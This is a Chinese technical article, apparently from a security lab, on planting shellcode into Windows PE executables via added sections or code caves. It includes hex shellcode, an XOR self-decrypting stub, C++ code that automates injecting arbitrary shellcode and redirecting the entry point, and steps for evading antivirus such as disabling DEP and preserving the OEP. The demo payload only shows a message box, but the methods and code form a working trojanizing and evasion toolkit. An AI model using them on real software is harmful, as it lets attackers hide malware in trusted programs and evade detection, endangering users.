@@ -1,0 +1,928 @@
+## 一、前言
+
+**过去的windows系统，漏洞百出，防不胜防，因此第三方杀毒软件几乎是装机必备。随着windows系统的不断更新，其安全防护措施也不断加强，传言Windows自带的windows
+defender已经可以完全替代第三方杀毒软件的工作，那么是否还需要安装第三方杀毒软件呢？**
+
+其实，恶意软件和杀毒软件是一对好兄弟，它们一直互相斗争、互相进步，随着杀软技术的提高，免杀技术也在不断提高。有些恶意程序的关注重点已经不在于“干坏事”了，它们已经把目光放在了“流量”上，毕竟现在是流量为王的时代。各种恶意程序通过广告、捆绑等形式来发展自己，其中的重灾区就是各种网站的下载工具。就连某搜索引擎提供的下载中心中的软件都被添加了恶意代码。  
+
+![image.png](https://image.3001.net/images/20180608/15284287296240.png!small)
+
+2012年多个SSH客户端中被发现植入后门，导致了大量SSH帐号密码泄露；2018年5月再次发生类似事件。攻击者是如何在正常的软件内添加恶意代码又不影响原程序执行的呢？
+
+天融信阿尔法实验室对他们的实现原理和方法以及杀毒软件检测情况进行了分析。一般给程序加恶意代码而不影响程序运行的方式主要有两种：添加额外区段添加shellcode和利用代码洞添加shellcode。
+
+## 二、添加额外区段添加shellcode
+
+添加额外区段添加shellcode是指通过添加区段把shellcode添加到一个PE文件中，其优点是不需要考虑shellcode的大小、容易实现、易于自动化。缺点是既然是“额外段”，shellcode位置固定，就好像人身体多出个“零件”，非常容易被杀软检测到。
+
+通过添加区段添加shellcode，我们需要完成以下工作：
+
+> PE文件添加额外区段
+>
+> 把准备好的shellcode拷贝到该区段中
+>
+> 改变程序执行流程，先执行shellcode再运行正常程序
+>
+> 用到的工具：VC6.0 (或其他IDE)、LordPE、010Editor、OD/X64Dbg
+
+a) PE文件准备：
+
+用VC6.0编译生成一个32位MFC小程序。
+
+示例程序下载地址：链接: <https://pan.baidu.com/s/1r82qf1F7AUdj-jjIDrS9Ew> 密码: b5rz
+
+b) 使用LordPE打开并编辑PE文件，添加区段
+
+![image.png](https://image.3001.net/images/20180608/1528425469947.png!small)
+
+c) 编辑区段大小和属性
+
+![image.png](https://image.3001.net/images/20180608/15284254791470.png!small)
+
+区段大小为shellcode大小对0x200取整，我们暂定0x1000
+
+因为我们的shellcode需要执行，可能被添加的shellcode执行时还要自修改，所以我们需要把区段属性改为可读可写可执行。最后别忘记保存。
+
+![image.png](https://image.3001.net/images/20180608/15284255236662.png!small)
+
+![image.png](https://image.3001.net/images/20180608/15284255347534.png!small)
+
+![image.png](https://image.3001.net/images/20180608/15284256894258.png!small)
+
+d) 填充区段内容
+
+这时候我们添加的区段还只是理论存在的区段，文件本身并没有这段内容 (文件大小未变)，下面我们利用010Editor等二进制工具给文件实际添加上这段空间。
+
+用010Editor打开我们刚才编辑的PE文件，移动到文件的最后位置0x33000，插入0x1000个字节。
+
+![image.png](https://image.3001.net/images/20180608/15284256984410.png!small)![image.png](https://image.3001.net/images/20180608/15284257076116.png!small)
+
+到这里，我们就完成了一个内容完全为0的区段的添加。
+
+e) 拷贝shellcode到新区段
+
+拷贝一份我们准备好的Hello World!的shellcode(实现一个弹框的功能)到该区段
+
+60 83 EC 20 EB 41 47 65 74 50 72 6F 63 41 64 64
+
+72 65 73 73 4C 6F 61 64 4C 69 62 72 61 72 79 45
+
+78 41 00 55 73 65 72 33 32 2E 64 6C 6C 00 4D 65
+
+73 73 61 67 65 42 6F 78 41 00 48 65 6C 6C 6F 20
+
+57 6F 72 6C 64 21 00 E8 00 00 00 00 5B E9 9F 00
+
+00 00 55 8B EC 83 EC 0C 52 8B 55 08 8B 72 3C 8D
+
+34 32 8B 76 78 8D 34 32 8B 7E 1C 8D 3C 3A 89 7D
+
+FC 8B 7E 20 8D 3C 3A 89 7D F8 8B 7E 24 8D 3C 3A
+
+89 7D F4 33 C0 EB 01 40 8B 75 F8 8B 34 86 8B 55
+
+08 8D 34 32 8B 5D 0C 8D 7B BA B9 0E 00 00 00 FC
+
+F3 A6 75 E3 8B 75 F4 33 FF 66 8B 3C 46 8B 55 FC
+
+8B 34 BA 8B 55 08 8D 04 32 5A 8B E5 5D C2 08 00
+
+55 8B EC 83 EC 08 8B 5D 14 8D 4B D7 6A 00 6A 00
+
+51 FF 55 0C 8D 4B E2 51 50 FF 55 10 89 45 FC 8D
+
+4B EE 6A 00 51 51 6A 00 FF 55 FC 8B E5 5D C2 10
+
+00 64 8B 35 30 00 00 00 8B 76 0C 8B 76 1C 8B 36
+
+8B 56 08 53 52 E8 48 FF FF FF 8B F0 52 8D 4B C8
+
+51 52 FF D0 5A 53 56 50 52 E8 A2 FF FF FF 83 C4
+
+20 61
+
+![image.png](https://image.3001.net/images/20180608/15284257175624.png!small)
+
+f) 更改PE文件的OEP到我们的shellcode起始位置
+
+shellcode的起始虚拟地址就是我们添加区段时新区段的起始地址0x38000
+
+![image.png](https://image.3001.net/images/20180608/15284257254262.png!small)
+
+更改程序的OEP为0x38000,保存
+
+![image.png](https://image.3001.net/images/20180608/15284257416735.png!small)
+
+g) 在shellcode后添加跳转到原OEP的代码：JMP 原OEP
+
+shellcode执行完后，为了不影响原程序运行，还需要执行原程序的代码，原程序的代码从哪里开始执行呢？就是被我们修改前的OEP的值。改变代码的执行流程需要用到指令JMP
+XXX。XXX就是跳转偏移。
+
+跳转偏移=原OEP-JMP所在位置-5
+
+原OEP=0x9486
+
+JMP所在位置=新区段地址0x38000(新的OEP)+Shellcode大小0x122
+
+跳转偏移=0x9486-(0x38000+0x122)-5=0xFFFD135F
+
+所以跳转到原OEP的Opcode为 E9 5F 13 FD FF
+
+在我们e)中添加的shellcode后添加这几个Opcode.
+
+![image.png](https://image.3001.net/images/20180608/15284257535449.png!small)
+
+h) 运行该程序
+
+程序运行后，先弹出Hello World，shellcode正常执行，然后才运行正常程序。
+
+![image.png](https://image.3001.net/images/20180608/15284257711437.png!small)
+
+## 三、代码洞添加Shellcode
+
+PE文件有其特殊的结构，其身体是由不同的节(区段)组成的。这些节内，或节与节之间有文件执行时用不到的填充字节0，这些被0填充的空间我们称之为代码洞。如果这些连续的0空间足够放下我们的shellcode，那么我们就可以考虑把我们的shellcode替换掉同样大小的0，这样杀软的异常段检测对我们来说就没用了。
+
+代码洞所在的段最好是可写段，因为有些shellcode执行时会自修改，如果找到的是不可写段，需要修改段保护属性，而段属性异常会被某些杀软当作异常点检测。当然，如果被加的shellcode不需要自修改，段属性就没这个要求了。
+
+代码洞找到后，不改变OEP的情况下，如何让我们的shellcode被执行呢，这就需要分析你要添加shellcode的程序的执行流程了，在非敏感位置，截断程序的执行流程，使其跳转到我们的shellcode，shellcode执行完后再跳转回正常流程。
+
+代码洞添加的优点就是shellcode位置不固定、文件本身大小不变，不容易被杀软检测到。缺点是需要在文件本身中搜索代码洞，代码洞的大小不能小于Shellcode大小，条件苛刻，实现相对困难，不容易自动化。
+
+手工查找代码洞并添加shellcode过程：
+
+> 查找代码洞
+>
+> 找到跳转点，跳转到shellcode
+
+a) 查找代码洞
+
+虽然节内也可能有大量的0字节，但节内数据我们不能保证是不是有用的数据，比如初始化为0的全局变量，所以一般我们查找的代码洞都是节与节之间的0，这些0在PE中是用来节对齐的，不会被代码执行用到，正适合被我们拿来使用。有一个开源项目cave_miner（<https://github.com/Antonin-Deniau/cave_miner>）可以查找合适的代码洞，但是实际使用不太理想。我们就自己动手去查找，你会发现这很容易实现。
+
+还是我们的示例程序。LordPE查看PE信息。
+
+![image.png](https://image.3001.net/images/20180608/15284257964607.png!small)
+
+其中文件块对齐大小就是节的对齐单位，即每个区段都是该值的整数倍，如果该区段的有效字节数不是该值的整数倍，就会用0补齐。这些补齐用的0就是我们要找的节间代码洞，所以我们要找的代码洞大小不会超过这个值。如果你的shellcode体积比这个值大，那你就要换个文件添加shellcode了。如果是指定文件添加shellcode，又没有合适的代码洞怎么办呢，那就要大量改造这个PE文件，这就违背了代码洞添加shellcode的初衷：不改变文件大小。
+
+如果该值合适，那么我们就可以在节与节之间查找我们需要的代码洞了，用LordPE查看区段信息。
+
+![image.png](https://image.3001.net/images/20180608/1528425805531.png!small)
+
+红色圈内就是每个区段在文件中的起始偏移值。我们的Helloworld的shellcode大小为0x122,用010Editor打开程序，第1个区段的起始位置0x1000，查看第1个区段前有没有合适的代码洞。
+
+![image.png](https://image.3001.net/images/20180608/15284258136203.png!small)
+
+如上图所示，PE头部和第1个区段之间有大量的0，满足我们的条件。
+
+b) 找触发点跳转到Shellcode
+
+将HelloWorld shellcode拷贝到代码洞中的合适位置，这里我们选择0x300这个地方。
+
+下面就是分析加shellcode程序，找到合适的跳转位置，跳转到我们的shellcode去执行。什么样的位置才是合适的跳转位置呢，其实没有什么固定要求，只要不截断正常指令的位置一般都符合我们的要求。但如果杀毒软件通过沙箱来运行程序检测异常行为，shellcode还是会被检测到，所以一般我们选特殊的“触发点”作为我们的跳转偏移。比如我们当前程序，点击确定后才会弹错误提示框，所以我们可以把“点击按钮”这个事件的触发代码作为跳转点。
+
+用X64Dbg打开处理后的程序，分析找到弹框位置(通过搜索“错误”这个字符串可以快速定位)：
+
+![image.png](https://image.3001.net/images/20180608/15284258357743.png!small)
+
+把push 0042B0C0换成JMP Shellcode位置，即JMP 400300
+
+![image.png](https://image.3001.net/images/20180608/15284258416463.png!small)
+
+在Shellcode的最后位置把刚才被更改的指令恢复，并跳转回401575
+
+![image.png](https://image.3001.net/images/20180608/15284258473128.png!small)
+
+右键补丁保存修改后的文件
+
+![image.png](https://image.3001.net/images/20180608/15284258542885.png!small)
+
+![image.png](https://image.3001.net/images/20180608/15284258622678.png!small)
+
+到这一步为止，我们的代码洞加Shellcode就完成了。点击确定，弹出HelloWorld,shellcode运行正常，再提示错误，程序运行正常
+
+![image.png](https://image.3001.net/images/20180608/15284258736978.png!small)
+
+![image.png](https://image.3001.net/images/20180608/15284258784176.png!small)
+
+## 四、自动化工具实现
+
+经过上述两种方式添加shellcode后我们已经发现，加区段的方式容易实现自动化，而代码洞实现则比较困难。下面我们就开始看看如何用代码来实现加区段的方式添加shellcode。主要分以下几步：
+
+检测PE文件是否有效
+
+提取shellcode文件中的shellcode并获取shellcode大小
+
+添加新区段，把shellcode拷贝到新区段
+
+更改OEP到新区段,并添加跳转到原OEP的OPCODE
+
+a) 检测PE文件
+
+检测PE文件是否符合要求：
+
+    
+    
+    // 检查是否有效的PE文件
+    
+    BOOL CBackDoor::CheckPe(const TCHAR* szPath)
+    
+    {
+    
+        // 1.打开文件
+    
+        HANDLE hFile = CreateFile(szPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    
+        if (INVALID_HANDLE_VALUE == hFile)
+    
+        {
+    
+             MessageBox(NULL, L"打开文件失败！", NULL, MB_OK);
+    
+             return FALSE;
+    
+        }
+    
+        // 2.判断文件大小是否大于100M(暂定)
+    
+        LARGE_INTEGER llSize = {};
+    
+        GetFileSizeEx(hFile, &llSize);
+    
+        if (0 != llSize.HighPart || llSize.LowPart >= 100 * 1024 * 1024)
+    
+        {
+    
+             MessageBox(NULL, L"文件太大！", NULL, MB_OK);
+    
+             return FALSE;
+    
+        }
+    
+        m_dwSize = llSize.LowPart;
+    
+        // 3.判断MZ以及PE 32位
+    
+        BOOL bSucceed = FALSE;
+    
+        // 3.1读取文件到内存
+    
+        m_pBuf = new BYTE[llSize.LowPart]{};
+    
+        DWORD dwRead = 0;// 实际读取字节数
+    
+        __try
+    
+        {
+    
+             if (!ReadFile(hFile, m_pBuf, m_dwSize, &dwRead, NULL)) __leave;
+    
+             // 3.2 判断MZ
+    
+             PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)m_pBuf;
+    
+             if (IMAGE_DOS_SIGNATURE != pDos->e_magic) __leave;
+    
+             // 3.3 判断PE
+    
+             PIMAGE_NT_HEADERS32 pNtHeader = (PIMAGE_NT_HEADERS32)(m_pBuf + pDos->e_lfanew);
+    
+             if (IMAGE_NT_SIGNATURE != pNtHeader->Signature) __leave;
+    
+             // 3.4 判断32位
+    
+             if (!(pNtHeader->FileHeader.Characteristics & IMAGE_FILE_32BIT_MACHINE)) __leave;
+    
+             bSucceed = TRUE;
+    
+        }
+    
+        __finally
+    
+        {
+    
+             if (!bSucceed)
+    
+             {
+    
+                 delete[] m_pBuf;
+    
+                 m_pBuf = nullptr;
+    
+                 MessageBox(NULL, L"文件校验失败！", 0, MB_OK);
+    
+             }
+    
+        }
+    
+        CloseHandle(hFile);
+    
+        return bSucceed;
+    
+    }
+
+b) 提取Shellcode
+
+解析Shellcode文件，获取Shellcode大小，并加密，加密后和解密Shellcode组合成新Shellcode。
+
+解密Shellcode为：
+
+    
+    
+    // 提取Shellcode文件中的Shellcode的大小,该文件就是Shellcode的2进制文件
+    
+    BOOL CBackDoor::ExtractShellcode(const TCHAR* szPath, PBYTE &pShellcode, DWORD &dwShellcodeSize)
+    
+    {
+    
+        // 打开文件
+    
+        HANDLE hFileShellcode= CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    
+        if (INVALID_HANDLE_VALUE == hFileShellcode) return FALSE;
+    
+        DWORD dwBytesRead = 0;
+    
+        // 获取Shellcode大小
+    
+        DWORD dwBytesToRead = GetFileSize(hFileShellcode, NULL);
+    
+        // 申请空间存放解密Shellcode+即将被加密的Shellcode
+    
+        dwShellcodeSize = dwBytesToRead + sizeof(g_DecryptCode);
+    
+        PBYTE pBuf = new BYTE[dwShellcodeSize]{};
+    
+        // 更新解密Shellcode的信息
+    
+        *(WORD*)&g_DecryptCode[14] = (WORD)(dwBytesToRead - 1);
+    
+        memcpy_s(pBuf, sizeof(g_DecryptCode), g_DecryptCode, sizeof(g_DecryptCode));
+    
+        // 读取Shellcode
+    
+        int nResult = ReadFile(hFileShellcode, pBuf+ sizeof(g_DecryptCode), dwBytesToRead, &dwBytesRead, NULL);
+    
+        if (!nResult || dwBytesToRead != dwBytesRead)
+    
+        {
+    
+             MessageBox(NULL,L"Shellcode文件解析错误！",NULL,MB_OK);
+    
+             CloseHandle(hFileShellcode);
+    
+             delete[] pBuf;
+    
+             return  FALSE;
+    
+        }
+    
+        // 加密Shellcode
+    
+        pShellcode= pBuf + sizeof(g_DecryptCode);
+    
+        for (int i=0;i<dwBytesRead;++i)
+    
+        {
+    
+             // 使用02异或
+    
+             pShellcode[i] ^= 0x02;
+    
+        }
+    
+        CloseHandle(hFileShellcode);
+    
+        pShellcode= pBuf;
+    
+        return TRUE;
+    
+    } 
+
+c) 添加Shellcode段
+
+添加Shellcode区段：我们需要改变原文件的区段信息，添加一个新的区段，并在文件后追加对应大小的区段。添加的区段信息包括：区段名、区段在文件中的大小、区段文件偏移、区段的虚拟大小，区段在内存中的偏移、区段保护属性。
+
+    
+    
+    // 添加新的区段
+    
+    PBYTE CBackDoor::AddSection(const char* pName, DWORD dwRSize, DWORD dwAttr)
+    
+    {
+    
+        // 1.去除DEP，改写区段信息:区段数目、新的区段信息
+    
+        PIMAGE_NT_HEADERS32 pNtHeader = (PIMAGE_NT_HEADERS32)(m_pBuf + ((PIMAGE_DOS_HEADER)m_pBuf)->e_lfanew);
+    
+        // 去除DEP
+    
+        pNtHeader->OptionalHeader.DllCharacteristics &= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
+    
+        // 新区段的信息：区段名，区段大小，区段属性
+    
+        DWORD dwCount = pNtHeader->FileHeader.NumberOfSections;
+    
+        PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNtHeader);
+    
+        // 区段名
+    
+        if (strlen(pName) >= 8)
+    
+        {
+    
+             memcpy_s(pSec[dwCount].Name, 8, pName, 8);
+    
+        }
+    
+        else
+    
+        {
+    
+             strcpy_s((char*)pSec[dwCount].Name, 8, pName);
+    
+        }
+    
+        // 虚拟大小
+    
+        pSec[dwCount].Misc.VirtualSize = dwRSize;
+    
+        // 虚拟地址/*同时更新m_uiOEPNew的值*/
+    
+        pSec[dwCount].VirtualAddress =
+    
+             pSec[dwCount - 1].VirtualAddress +
+    
+             (pSec[dwCount - 1].Misc.VirtualSize + 0x0fff) / 0x1000 * 0x1000;
+    
+        m_uiOEPNew = pSec[dwCount].VirtualAddress;
+    
+        // 区段在文件中的大小:0x200对齐
+    
+        pSec[dwCount].SizeOfRawData = (dwRSize + 0x1ff) / 0x200 * 0x200;
+    
+        // 区段在文件中的偏移
+    
+        pSec[dwCount].PointerToRawData = pSec[dwCount - 1].PointerToRawData + pSec[dwCount - 1].SizeOfRawData;
+    
+        pSec[dwCount].Characteristics = dwAttr;// 区段属性
+    
+        // 1.2区段数目+1
+    
+        pNtHeader->FileHeader.NumberOfSections += 1;
+    
+        // 2.改变PE信息中的文件信息,更新m_dwSize,原大小0x1000对齐+新增大小
+    
+        pNtHeader->OptionalHeader.SizeOfImage = (pNtHeader->OptionalHeader.SizeOfImage+0x0FFF)/0x1000*0x1000+dwRSize;
+    
+        DWORD dwNewSize = m_dwSize + pSec[dwCount].SizeOfRawData;
+    
+        // 3.在文件尾添加新的区段内容：空
+    
+        // 申请新的空间，把原文件内容拷贝到新文件
+    
+        PBYTE pNewBuf = new BYTE[dwNewSize]{};
+    
+        // 3.1拷贝原文件内容到新的buf
+    
+        memcpy_s(pNewBuf, dwNewSize, m_pBuf, m_dwSize);
+    
+        // 3.2释放原内存，更新m_pBuf和m_dwSize;
+    
+        delete[] m_pBuf;
+    
+        m_pBuf = pNewBuf;
+    
+        DWORD dwOldSize = m_dwSize;
+    
+        m_dwSize = dwNewSize;
+    
+        // 返回新区段的位置
+    
+        return m_pBuf + dwOldSize;
+    
+    }
+
+拷贝Shellcode到新区段
+
+    
+    
+    // 添加空区段
+    
+    PBYTE pBufNewSec = AddSection(".trx", dwRsize, 0xC00000C0);
+    
+    // 拷贝Shellcode相关代码到新区段
+    
+    // Shellcode
+    
+    memcpy_s(pBufNewSec, dwRsize, pShellcode, dwShellcodeSize); 
+
+d) 更改OEP
+
+    
+    
+    // 重定位OEP到Shellcode位置
+    
+    pNt->OptionalHeader.AddressOfEntryPoint = m_uiOEPNew;
+    
+    // 修复并添加跳转到原OEP的代码:原OEP-JMP所在位置-5
+    
+    *(DWORD*)(g_cJmpOep + 1) = m_uiOEPSrc - (m_uiOEPNew + dwShellcodeSize) - 5;
+    
+    memcpy_s(pBufNewSec + dwShellcodeSize, dwRsize -dwShellcodeSize,g_cJmpOep,sizeof(g_cJmpOep));
+
+e) 生成新文件
+
+整合上面几步的代码，生成新文件：
+
+    
+    
+    // 自定义Shellcode改变OEP
+    
+    BOOL CBackDoor::Entry_CustomShellcode_OEPChanged(const TCHAR* szPath, const TCHAR* szShellcodePath)
+    
+    {
+    
+        // 1. 检查PE文件是否有效
+    
+        if (!CheckPe(szPath)) { Clear(); return FALSE; }
+    
+        // 2. 提取Shellcode文件中的Shellcode
+    
+        PBYTE pShellcode= nullptr;
+    
+        DWORD dwShellcodeSize = 0;
+    
+        if (!ExtractShellcode(szShellcodePath, pShellcode, dwShellcodeSize)) return FALSE;
+    
+        // 3.添加新区段
+    
+        // 3.1 新增区段的大小->Shellcode的大小+ jmp xxx
+    
+        DWORD dwRsize = dwShellcodeSize + sizeof(g_cJmpOep);
+    
+        // 3.2 添加空区段
+    
+        PBYTE pBufNewSec = AddSection(".trx", dwRsize, 0xC00000C0);
+    
+        // 3.3 拷贝Shellcode相关代码到新区段
+    
+        // 3.3.1 Shellcode
+    
+        memcpy_s(pBufNewSec, dwRsize, pShellcode, dwShellcodeSize);
+    
+        m_pShellcode = pBufNewSec;
+    
+        // 4.将oep定位到Shellcode，在Shellcode后添加跳转到原oep的代码
+    
+        // 4.1 获得原OEP的值
+    
+        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)m_pBuf;
+    
+        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(m_pBuf + pDos->e_lfanew);
+    
+        m_uiOEPSrc = pNt->OptionalHeader.AddressOfEntryPoint;
+    
+        // 4.2 重定位OEP到Shellcode位置
+    
+        pNt->OptionalHeader.AddressOfEntryPoint = m_uiOEPNew;
+    
+        // 4.3 修复并添加跳转到原OEP的代码:原OEP-JMP所在位置-5
+    
+        *(DWORD*)(g_cJmpOep + 1) = m_uiOEPSrc - (m_uiOEPNew + dwShellcodeSize) - 5;
+    
+        memcpy_s(pBufNewSec + dwShellcodeSize, dwRsize - dwShellcodeSize,
+    
+             g_cJmpOep, sizeof(g_cJmpOep));
+    
+        // 5. 生成新的文件
+    
+        OutNewFile(szPath);
+    
+        // 6. 资源清理
+    
+        Clear();
+    
+        delete[] pShellcode;
+    
+        pShellcode= nullptr;
+    
+        return TRUE;
+    
+    }
+
+## 五、免杀检测
+
+手工完成加Shellcode后，最终成品会被杀毒软件检测到吗？我们分别将这几种添加方法生成的样本上传到VirusTotal去检测一下(<https://www.virustotal.com/#/home/upload>).
+
+a) 增加区段加原始Shellcode：报毒率15/65。
+
+![image.png](https://image.3001.net/images/20180608/15284259303373.png!small)
+
+这时候添加的Shellcode，杀软可以通过检测shellcode特点、检测异常区段、OEP位置等来检测异常。后面我们会依次验证。
+
+b) 加密的Shellcode
+
+shellcode的实现一般有其共通点：访问PEB、查找Kernel32.dll、查找需要用到的函数等。因此这些特征可能被杀软作为异常检测的点，所以我们用一个加密的Shellcode隐藏这些特征来进行测试
+
+准备加密的HelloWorld Shellcode,替换未加密的Shellcode，更改章二中的第e、g两步，再检测。
+
+shellcode怎么加密呢？在这里我们把Helloworld!的shellcode用010editor工具2进制异或一下，这里我们选择用02异或：
+
+![image.png](https://image.3001.net/images/20180608/15284259382664.png!small)![image.png](https://image.3001.net/images/20180608/15284259531846.png!small)
+
+异或后的shellcode已经被改变，想要执行需要我们再异或恢复过来，所以我们在加密后的shellcode前添加一些恢复shellcode的指令来实现自修改。
+
+打开X64Dbg，调试任一程序，编辑完成以下汇编指令：  
+![image.png](https://image.3001.net/images/20180608/15284259881389.png!small)
+
+下面解释下这段指令：
+
+PUSHAD：保存环境变量，和最后的POPAD恢复环境呼应。
+
+call xxx,和pop eax用于获取pop eax所在行的地址，这样无论我们的shellcode在哪，都能定位到shellcode的位置了。
+
+lea esi,
+[eax+0x19],用于获取我们被加密的shellcode的起始地址，因为我们的shellcode要放在这段解密指令的后面，所以距离pop
+eax正好0x19个字节。
+
+xor ecx,ecx和mov cx,121,是需要解密的次数，就是我们的shellcode大小-1
+
+mov al, [esi+ecx*1]
+
+xor al, 0x02
+
+mov [esi+ecx*1], al
+
+loop 0x00409496(不同实验该值不同，就是mov al, [esi+ecx*1]的地址)
+
+xor byte ptr [esi+ecx*1], 0x02
+
+这几行代码就是把我们的shellcode从后向前依次与0x02异或解密
+
+把这段指令的字节码提取出来：
+
+![image.png](https://image.3001.net/images/20180608/15284260063865.png!small)
+
+![image.png](https://image.3001.net/images/20180608/15284260119700.png!small)
+
+选中409486~4094A4的范围，shift+C复制。
+
+010Editor新建文件：
+
+![image.png](https://image.3001.net/images/20180608/15284260202041.png!small)
+
+切换到16进制格式;  
+![image.png](https://image.3001.net/images/20180608/15284260365957.png!small)
+
+ctrl+shift+v,粘贴：
+
+![image.png](https://image.3001.net/images/20180608/15284260496992.png!small)
+
+其中，第1行的最后两个字节21
+01就是我们的被解密shellcode的大小-1，第2行的两个02就是我们的解密key.以后只需要改变这几个值，我们就可以实现任意shellcode的加解密了。把我们加密后的Helloworld
+shellcode添加到上面字节码的后面，就是我们加密后的自解密shellcode了：
+
+60 E8 00 00 00 00 58 8D 70 19 33 C9 66 B9 21 01
+
+8A 04 0E 34 02 88 04 0E E2 F6 80 34 0E 02 61 62
+
+81 EE 22 E9 43 45 67 76 52 70 6D 61 43 66 66 70
+
+67 71 71 4E 6D 63 66 4E 6B 60 70 63 70 7B 47 7A
+
+43 02 57 71 67 70 31 30 2C 66 6E 6E 02 4F 67 71
+
+71 63 65 67 40 6D 7A 43 02 4A 67 6E 6E 6D 22 55
+
+6D 70 6E 66 23 02 EA 02 02 02 02 59 EB 9D 02 02
+
+02 57 89 EE 81 EE 0E 50 89 57 0A 89 70 3E 8F 36
+
+30 89 74 7A 8F 36 30 89 7C 1E 8F 3E 38 8B 7F FE
+
+89 7C 22 8F 3E 38 8B 7F FA 89 7C 26 8F 3E 38 8B
+
+7F F6 31 C2 E9 03 42 89 77 FA 89 36 84 89 57 0A
+
+8F 36 30 89 5F 0E 8F 79 B8 BB 0C 02 02 02 FE F1
+
+A4 77 E1 89 77 F6 31 FD 64 89 3E 44 89 57 FE 89
+
+36 B8 89 57 0A 8F 06 30 58 89 E7 5F C0 0A 02 57
+
+89 EE 81 EE 0A 89 5F 16 8F 49 D5 68 02 68 02 53
+
+FD 57 0E 8F 49 E0 53 52 FD 57 12 8B 47 FE 8F 49
+
+EC 68 02 53 53 68 02 FD 57 FE 89 E7 5F C0 12 02
+
+66 89 37 32 02 02 02 89 74 0E 89 74 1E 89 34 89
+
+54 0A 51 50 EA 4A FD FD FD 89 F2 50 8F 49 CA 53
+
+50 FD D2 58 51 54 52 50 EA A0 FD FD FD 81 C6 22
+
+63
+
+用加密后的shellcode替换原来的shellcode，后面添加上JMP OEP的OPCODE(怎么计算前面已经说过)：E9 40 13 FD FF
+
+![image.png](https://image.3001.net/images/20180608/15284260638914.png!small)
+
+![image.png](https://image.3001.net/images/20180608/15284260695063.png!small)
+
+发现报毒率有所降低，与之前报毒的公司也不同，说明被加密的shellcode更安全。
+
+c) 不可执行的shellcode段
+
+在章二c)中我们添加的shellcode段要求可读可写可执行，这样一个PE文件就有两个可执行区段了，杀软可以通过这点来进行异常检测。
+
+所以我们把区段属性中的可执行属性去掉。
+
+![image.png](https://image.3001.net/images/20180608/15284260829799.png!small)
+
+去掉可执行属性后，我们的shellcode还怎么执行呢？把该PE文件的数据执行保护(DEP)关闭，这样就可以在非代码区跑代码了。
+
+用010Editor打开要去除DEP属性的PE文件，010Editor已经自动解析了PE文件格式。右侧(或下侧)找到IMAGE_NT_HEADERS，展开，找到IMAGE_OPTIONAL_HEADER32，继续展开，找到struct
+DLL_CHARACTERISTICS DllCharacteristics，把其中的WORD
+IMAGE_DLLCHARACTERISTICS_NX_COMPAT : 1双击设置为0即可。
+
+![image.png](https://image.3001.net/images/20180608/1528426094981.png!small)
+
+检测结果如下：报毒率显著降低
+
+![image.png](https://image.3001.net/images/20180608/15284261005302.png!small)
+
+d) 不变的OEP
+
+经过上述b、c两步后，还剩一个我们猜测易被检测的点：OEP的位置。正常的PE文件，其OEP一般在第1或第2个区段，被“处理”过的程序，比如加壳程序，才会把OEP设置到其他区段。这次我们尝试不改变程序的OEP，来实现加Shellcode。
+
+要实现不改变程序的OEP，又能先执行Shellcode，我们需要解决两个问题：1. 把原程序OEP处的前5个字节改成跳转到shellcode的指令。2.
+在shellcode后面恢复原OEP被修改的5个字节，跳转回原OEP。
+
+修改原OEP处的5个字节跳转到我们的shellcode处：跳转偏移=新OEP-原OEP-5=0x38000-0x9486-5=0x2EB75。原OEP为0x9486，参考区段表(下图)，OEP在文件中的位置和相对虚拟地址相同，也为0x9486。
+
+![image.png](https://image.3001.net/images/20180608/15284261083781.png!small)
+
+利用010Editor修改该位置(9486h)处的5个字节，修改之前记录下这5个字节，后面还要在Shellcode里还原它们。
+
+修改前：
+
+![image.png](https://image.3001.net/images/20180608/15284261133759.png!small)
+
+修改后：
+
+![image.png](https://image.3001.net/images/20180608/15284261192637.png!small)
+
+恢复OEP并跳转到原OEP的Shellcode如下：
+
+60 E8 0F 00 00 00 61 E9 99 99 99 99 66 66 66 66
+
+11 11 11 11 11 55 8B EC 83 EC 2C 56 57 C6 45 D4
+
+6B C6 45 D5 65 C6 45 D6 72 C6 45 D7 6E C6 45 D8
+
+65 C6 45 D9 6C C6 45 DA 33 C6 45 DB 32 C6 45 DC
+
+2E C6 45 DD 64 C6 45 DE 6C C6 45 DF 6C C6 45 E0
+
+00 83 65 F8 00 83 65 FC 00 83 65 F4 00 64 8B 35
+
+30 00 00 00 8B 46 08 8B 76 0C 8B 76 1C 8B 36 8B
+
+76 08 89 75 F8 E8 00 00 00 00 5E 03 46 92 89 45
+
+FC 83 EE 6A 89 75 F4 8B 55 F8 B9 87 32 D8 C0 E8
+
+6D 00 00 00 89 45 E8 6A 00 6A 00 8D 45 D4 50 FF
+
+55 E8 89 45 E4 8B 55 E4 B9 1E A4 64 EF E8 4F 00
+
+00 00 89 45 EC 8D 45 F0 50 6A 40 6A 05 FF 75 FC
+
+FF 55 EC 8B 7D FC 8B 75 F4 FC B9 05 00 00 00 F3
+
+A4 8D 45 F0 50 FF 75 F0 6A 05 FF 75 FC FF 55 EC
+
+5F 5E 8B E5 5D C3 56 33 F6 EB 09 C1 CE 07 0F BE
+
+C0 03 F0 41 8A 01 84 C0 75 F1 3B D6 5E 0F 94 C0
+
+C3 55 8B EC 83 EC 10 53 56 57 8B FA 89 4D FC 33
+
+F6 8B 47 3C 8B 44 38 78 03 C7 8B 48 1C 8B 50 20
+
+03 CF 8B 58 18 03 D7 89 4D F0 8B 48 24 03 CF 89
+
+55 F8 89 4D F4 85 DB 74 20 8B 0C B2 8B 55 FC 03
+
+CF E8 A0 FF FF FF 84 C0 75 1D 8D 43 FF 3B F0 74
+
+12 8B 55 F8 46 3B F3 72 E0 8B 45 F0 5F 5E 5B 8B
+
+E5 5D C3 33 C0 EB F5 8B 45 F4 8B 4D F0 0F B7 04
+
+70 8B 04 81 03 C7 EB E4
+
+其中，99 99 99 99是跳转到原OEP的偏移，66 66 66 66是原OEP的值，11 11 11 11
+11是原OEP处的5个字节(还记得上面修改前的5个字节吗55 8B EC 6A FF)。这几个值是需要修改的。
+
+偏移=原OEP-当前地址-5;
